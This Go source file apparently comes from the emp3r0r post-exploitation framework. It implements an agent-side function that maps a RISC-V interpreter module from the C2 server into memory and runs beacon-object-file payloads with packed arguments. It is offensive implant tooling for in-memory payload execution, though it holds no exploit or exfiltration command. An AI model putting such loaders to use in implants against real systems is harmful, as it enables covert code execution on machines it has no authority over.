package rvvm

import (
	"errors"
	"fmt"
	"runtime"
	"unsafe"

	"github.com/jm33-m0/emp3r0r/core/lib/coffloader"
	"github.com/jm33-m0/emp3r0r/core/lib/memdeps"
	"github.com/jm33-m0/emp3r0r/core/lib/memmod"
)

// dependencyName is the module that provides the RV32IMA interpreter. The C2
// hosts it as <name>.<arch>.gz; the agent maps it on demand. The guest payload
// is identical on both platforms; only the interpreter image differs.
func dependencyName() string {
	if runtime.GOOS == "windows" {
		return "rvvm_windows"
	}
	return "rvvm_linux"
}

// maxGuestOutput bounds the C string read back from the interpreter so a
// corrupted return value cannot make the agent scan unmapped memory forever.
const maxGuestOutput = 16 << 20

// bofArgs mirrors struct rv_bof_args in the interpreter module: the packed
// COFF argument buffer. Both fields are machine words so the layout matches on
// 32- and 64-bit hosts.
type bofArgs struct {
	Buf   uintptr
	Len   uintptr
	Libs  uintptr
	NLibs uintptr
}

// bofLib mirrors struct rv_lib: one delivered RISC-V library image.
type bofLib struct {
	Buf uintptr
	Len uintptr
}

// RunRiscvBof executes a portable BOF: an RV32 ET_REL object that the
// interpreter relocates against its embedded Beacon/libc runtime and calls at
// `export` with the packed COFF argument buffer.
func RunRiscvBof(payload []byte, export string, args []coffloader.CoffArg, libs [][]byte) (string, error) {
	if err := checkPlatform(); err != nil {
		return "", err
	}
	if len(payload) == 0 {
		return "", errors.New("empty payload")
	}
	if export == "" {
		export = "go"
	}
	packed, err := coffloader.PackCoffArgs(args)
	if err != nil {
		return "", fmt.Errorf("pack BOF arguments: %w", err)
	}
	wire, err := coffloader.PackLinuxArgs(packed)
	if err != nil {
		return "", fmt.Errorf("pack BOF wire arguments: %w", err)
	}
	if wire == nil {
		// No COFF arguments still need the uint32 body-length prefix that
		// BeaconDataParse expects.
		wire = []byte{0, 0, 0, 0}
	}

	// The interpreter runs guest code on the calling OS thread; pin the
	// goroutine so the mapped image and its stack stay on one thread.
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	var out string
	err = memdeps.Use(dependencyName(), func(module *memmod.Module) error {
		var bofPtr uintptr
		if len(wire) > 0 {
			bofPtr = uintptr(unsafe.Pointer(&wire[0]))
		}
		// Delivered libraries stay in memory; only their descriptors cross the
		// module boundary.
		descs := make([]bofLib, len(libs))
		for i := range libs {
			if len(libs[i]) == 0 {
				return errors.New("empty RISC-V library image")
			}
			descs[i] = bofLib{Buf: uintptr(unsafe.Pointer(&libs[i][0])), Len: uintptr(len(libs[i]))}
		}
		var libsPtr uintptr
		if len(descs) > 0 {
			libsPtr = uintptr(unsafe.Pointer(&descs[0]))
		}
		// Heap-allocate the argument descriptor: the interpreter dereferences
		// its fields, and a goroutine stack can move.
		desc := &bofArgs{
			Buf:   bofPtr,
			Len:   uintptr(len(wire)),
			Libs:  libsPtr,
			NLibs: uintptr(len(descs)),
		}
		entryBytes := append([]byte(export), 0)

		result, callErr := callRun(module,
			uintptr(unsafe.Pointer(&payload[0])),
			uintptr(len(payload)),
			uintptr(unsafe.Pointer(&entryBytes[0])),
			uintptr(unsafe.Pointer(desc)),
		)
		if callErr != nil {
			return callErr
		}
		runtime.KeepAlive(payload)
		runtime.KeepAlive(wire)
		runtime.KeepAlive(entryBytes)
		runtime.KeepAlive(libs)
		runtime.KeepAlive(descs)
		runtime.KeepAlive(desc)

		if result == 0 {
			if msg := callLastError(module); msg != "" {
				return fmt.Errorf("%s", msg)
			}
			return errors.New("RISC-V BOF failed")
		}

		out = readCString(result)
		// The interpreter owns the buffer; let it release it (a no-op) while
		// its code is still mapped.
		callFree(module, result)
		return nil
	})
	return out, err
}

// readCString reads a NUL-terminated string from mapped memory.
func readCString(ptr uintptr) string {
	if ptr == 0 {
		return ""
	}
	buf := make([]byte, 0, 64)
	for i := uintptr(0); i < maxGuestOutput; i++ {
		b := *(*byte)(unsafe.Pointer(ptr + i))
		if b == 0 {
			break
		}
		buf = append(buf, b)
	}
	return string(buf)
}
